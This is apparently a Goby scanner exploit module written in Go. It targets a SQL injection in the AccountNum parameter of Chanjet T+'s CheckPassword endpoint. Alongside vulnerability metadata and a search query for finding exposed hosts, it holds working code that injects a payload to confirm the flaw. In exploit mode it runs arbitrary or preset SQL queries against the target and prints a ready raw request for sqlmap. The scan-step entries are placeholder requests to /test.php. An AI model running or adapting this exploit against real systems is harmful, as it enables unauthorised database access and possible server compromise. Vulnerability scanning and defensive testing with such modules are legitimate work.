package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Chanjet-TPlus /Ufida.T.SM.Login.UIP.LoginManager.Ufida.T.SM.Login.UIP.ashx SQL Injection Vulnerability",
    "Description": "<p>Chanjet T+ is a new type of enterprise management software based on the Internet, with functional modules including: financial management, procurement management, inventory management, etc. It is mainly aimed at the integrated application of financial business of small and medium-sized industrial and trade enterprises and commercial enterprises, and integrates elements such as socialization, mobility, Internet of Things, e-commerce, and Internet information subscription. </p><p>Chanjet T+ /Ufida.T.SM.Login.UIP.LoginManager.Ufida.T.SM.Login.UIP.ashx interface does not filter the AccountNum parameter, and there is sql injection.</p>",
    "Product": "Chanjet-TPlus",
    "Homepage": "https://www.chanjet.com/",
    "DisclosureDate": "2024-05-19",
    "PostTime": "2024-08-19",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"><script>location='/tplus/';</script></body>\" && body=\"tplus\"",
    "GobyQuery": "body=\"><script>location='/tplus/';</script></body>\" && body=\"tplus\"",
    "Level": "1",
    "Impact": "<p>Chanjet T+ /Ufida.T.SM.Login.UIP.LoginManager.Ufida.T.SM.Login.UIP.ashx interface does not filter the AccountNum parameter, and there is sql injection. In addition to exploiting SQL injection vulnerabilities to obtain information in the database (e.g., administrator background passwords, site user personal information), attackers can even write Trojans to the server in the case of high privilege to further obtain server system privileges.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/adysec/nuclei_poc/blob/ce4c7200cc48cfd95678ea97adf05f7d102070f6/poc/sql/yonyou-chanjet-tplus-checkpassword-sqli.yaml"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name,is_admin",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT 111*6",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "畅捷通T+ /Ufida.T.SM.Login.UIP.LoginManager.Ufida.T.SM.Login.UIP.ashx SQL 注入漏洞",
            "Product": "畅捷通-TPlus",
            "Description": "<p>畅捷通 T+ 是一款基于互联网的新型企业管理软件，功能模块包括：财务管理、采购管理、库存管理等。主要针对中小型工贸和商贸企业的财务业务一体化应用，融入了社交化、移动化、物联网、电子商务、互联网信息订阅等元素。<br></p><p>畅捷通 T+&nbsp;/Ufida.T.SM.Login.UIP.LoginManager.Ufida.T.SM.Login.UIP.ashx 接口没有对AccountNum参数进行过滤，存在sql注入。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>畅捷通 T+&nbsp;/Ufida.T.SM.Login.UIP.LoginManager.Ufida.T.SM.Login.UIP.ashx 接口没有对AccountNum参数进行过滤，存在sql注入。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Chanjet-TPlus /Ufida.T.SM.Login.UIP.LoginManager.Ufida.T.SM.Login.UIP.ashx SQL Injection Vulnerability",
            "Product": "Chanjet-TPlus",
            "Description": "<p>Chanjet T+ is a new type of enterprise management software based on the Internet, with functional modules including: financial management, procurement management, inventory management, etc. It is mainly aimed at the integrated application of financial business of small and medium-sized industrial and trade enterprises and commercial enterprises, and integrates elements such as socialization, mobility, Internet of Things, e-commerce, and Internet information subscription.&nbsp;</p><p>Chanjet T+ /Ufida.T.SM.Login.UIP.LoginManager.Ufida.T.SM.Login.UIP.ashx interface does not filter the AccountNum parameter, and there is sql injection.</p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Chanjet T+ /Ufida.T.SM.Login.UIP.LoginManager.Ufida.T.SM.Login.UIP.ashx interface does not filter the AccountNum parameter, and there is sql injection. In addition to exploiting SQL injection vulnerabilities to obtain information in the database (e.g., administrator background passwords, site user personal information), attackers can even write Trojans to the server in the case of high privilege to further obtain server system privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9943"
}`
	setSqlPayloadHashsmassoufiuahbhfsauybdyuabxjs := func(hostInfo *httpclient.FixUrl, sql string) (res string, vulurl string, err error) {
		//配置漏洞存在的路径
		vulurl = "/tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword"
		requestConfig := httpclient.NewPostRequestConfig(vulurl)
		requestConfig.VerifyTls = false
		requestConfig.Header.Store("Content-Type", "application/json")
		requestConfig.FollowRedirect = false
		requestConfig.Data = `{
  "AccountNum": "(SELECT CONCAT('--start--',(` + sql + `),'--end--'))",
  "UserName": "adm1in",
  "Password": "c4ca4238a0b923820dcc509a6f75849b",
  "rdpYear": "2023",
  "rdpMonth": "7",
  "rdpDate": "5",
  "webServiceProcessID": "admin",
  "ali_csessionid": "",
  "ali_sig": "",
  "ali_token": "",
  "ali_scene": "",
  "role": "",
  "aqdKey": "",
  "cardNo": ""
}`
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = fmt.Errorf("fail")
			return "", "", err
		}
		res = resp.RawBody
		return res, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "37842782"
			// 无法通过计算MD5等计算手段判断是否存在注入，因此设置了一个随机的固定的值，用于判断是否存在注入，默认情况下不会出现这个值
			sql := `select 4657*8126`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `--start--([\s\S]*?)--end--`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashsmassoufiuahbhfsauybdyuabxjs
			res, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(res, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `POST /tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
Content-Type: application/json
Content-Length: 524

{
  "AccountNum": "(SELECT CONCAT('--start--',(select 4657*8126),'--end--'))",
  "UserName": "adm1in",
  "Password": "c4ca4238a0b923820dcc509a6f75849b",
  "rdpYear": "2023",
  "rdpMonth": "7",
  "rdpDate": "5",
  "webServiceProcessID": "admin",
  "ali_csessionid": "",
  "ali_sig": "",
  "ali_token": "",
  "ali_scene": "",
  "role": "",
  "aqdKey": "",
  "cardNo": ""
}
`

			// 3.配置正则语句，从响应包中提取出数据
			regular := `--start--([\s\S]*?)--end--`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashsmassoufiuahbhfsauybdyuabxjs
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "SELECT DB_NAME()"
					} else if way == "db_version" {
						sql = "SELECT @@version"
					} else if way == "user_name" {
						sql = "SELECT user"
					} else if way == "is_admin" {
						sql = "SELECT IS_SRVROLEMEMBER('sysadmin')"
					}
				}
				res, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(res, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = res
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
